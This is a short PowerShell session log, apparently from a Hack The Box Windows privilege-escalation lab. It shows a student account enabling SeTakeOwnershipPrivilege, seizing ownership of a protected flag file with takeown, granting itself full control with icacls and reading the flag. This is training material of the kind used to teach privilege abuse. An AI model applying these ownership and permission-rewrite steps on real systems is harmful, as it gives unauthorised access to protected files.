# SeTakeOwnershipPrivilege Example

<pre>PS C:\Users\htb-student\Documents> Import-Module .\EnableAllTokenPrivs.ps1



PS C:\Users\htb-student\Documents> .\EnableAllTokenPrivs.ps1



PS C:\Users\htb-student\Documents> whoami /priv

PRIVILEGES INFORMATION

----------------------

Privilege Name                Description                              State

============================= ======================================== =======

SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled

SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled



PS C:\Users\htb-student\Documents> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

FullName            LastWriteTime        Attributes Owner

--------            -------------        ---------- -----

C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive



PS C:\Users\htb-student\Documents> takeown /f 'C:\TakeOwn\flag.txt'

SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".



PS C:\Users\htb-student\Documents> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}

FullName            LastWriteTime        Attributes Owner

--------            -------------        ---------- -----

C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive WINLPE-SRV01\htb-student



PS C:\Users\htb-student\Documents> cat 'C:\TakeOwn\flag.txt'

cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.

At line:1 char:1

+ cat 'C:\TakeOwn\flag.txt'

+ ~~~~~~~~~~~~~~~~~~~~~~~~~

    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException

    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand



PS C:\Users\htb-student\Documents> icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

processed file: C:\TakeOwn\flag.txt

Successfully processed 1 files; Failed processing 0 files



PS C:\Users\htb-student\Documents> cat 'C:\TakeOwn\flag.txt'

1m_th3_f1l3_0wn3r_n0W!</pre>